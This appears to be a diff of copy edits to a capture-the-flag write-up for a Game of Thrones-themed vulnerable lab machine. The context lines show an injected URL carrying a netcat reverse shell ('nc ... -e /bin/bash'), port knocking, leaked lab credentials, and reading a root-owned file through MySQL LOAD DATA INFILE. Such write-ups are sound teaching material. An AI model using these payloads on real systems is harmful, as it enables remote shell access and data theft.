@@ -61,7 +61,7 @@ The second file, `the_wall.txt.nc`, was encrypted using the Advanced Encryption 
 mcrypt -d the_wall.txt.nc
 cat the_wall.txt
 ```
-The decrypted file provided explicit credentials (User: jonsnow, Pass: Ha1lt0th3k1ng1nth3n0rth!!!) and a URL the next phase (http://winterfell.7kingdoms.ctf/——W1nt3rf3ll——).
+The decrypted file provided explicit credentials (User: jonsnow, Pass: Ha1lt0th3k1ng1nth3n0rth!!!) and a URL for the next phase (http://winterfell.7kingdoms.ctf/——W1nt3rf3ll——).
 
 ### The Wall and The North (HTTP)
 
@@ -117,7 +117,7 @@ The decoded text revealed the fifth flag along with credentials (olennatyrell@7k
 
 ### The Reach (IMAP)
 
-According to my initial Nmap scan, the IMAP service (port 143) was marked as Filtered, indicating that an host-based firewall was blocking inbound traffic. The previous clue hinted at "opening the gates", implying a Port-Knocking defense mechanism. This technique keeps a port closed until the client sends a precise sequence of connection attempts to specific closed ports, dynamically updating firewall rules to allow access from the attacker's IP.
+According to my initial Nmap scan, the IMAP service (port 143) was marked as Filtered, indicating that a host-based firewall was blocking inbound traffic. The previous clue hinted at "opening the gates", implying a Port-Knocking defense mechanism. This technique keeps a port closed until the client sends a precise sequence of connection attempts to specific closed ports, dynamically updating firewall rules to allow access from the attacker's IP.
 
 Utilizing the port sequence recovered from earlier clues (3487, 64535, 12345), I executed the knock sequence: `knock -v 192.168.1.124 3487 64535 12345`. A subsequent port scan confirmed that port 143 had transitioned to the Open state. I then established a text-based interactive session with the IMAP service using telnet: `telnet 192.168.1.124 143`.
 
@@ -145,7 +145,7 @@ I then issued the payload-laden HTTP request, injecting a Netcat reverse shell s
 `http://192.168.1.124:1337/casterly-rock/blob/master/%22%22%60nc 192.168.1.58 5555 -e /bin/bash%60`.
 The server instantly executed the payload, yielding a reverse shell. I navigated to Tyrion's home folder and read the `checkpoint.txt` file to gather final database credentials.
 
-The King's Landing required interaction with the local MySQL database. Using the credentials extracted from the checkpoint file, I logged into the database engine directly from the compromised shell environment: `mysql -h 127.0.0.1 -u cerseilannister -p_g0dsHaveNoMercy_ -D kingslanding`.
+The compromise of King's Landing required interaction with the local MySQL database. Using the credentials extracted from the checkpoint file, I logged into the database engine directly from the compromised shell environment: `mysql -h 127.0.0.1 -u cerseilannister -p_g0dsHaveNoMercy_ -D kingslanding`.
 
 I listed the tables and discovered a table named `iron_throne`. Running a `SELECT *` query on it returned an obfuscated message written in Morse Code. Translating it using an external web utility pointed to an unconventional system file path: `/etc/mysql/flag`.
 
@@ -153,7 +153,7 @@ To read this root-protected file, I audited my database user privileges using: `
 The output showed that cerseilannister possessed `SELECT`, `INSERT`, and `CREATE` privileges, inherently inheriting the powerful `FILE` privilege. 
 
 To read the flag file, I abused the `LOAD DATA INFILE` SQL command, forcing the database engine to read the root-owned system file and import its raw text contents into a newly created temporary staging table:
-```bash
+```sql
 CREATE TABLE temporary_flag (content VARCHAR(500));
 LOAD DATA INFILE '/etc/mysql/flag' INTO TABLE temporary_flag;
 SELECT * FROM temporary_flag;
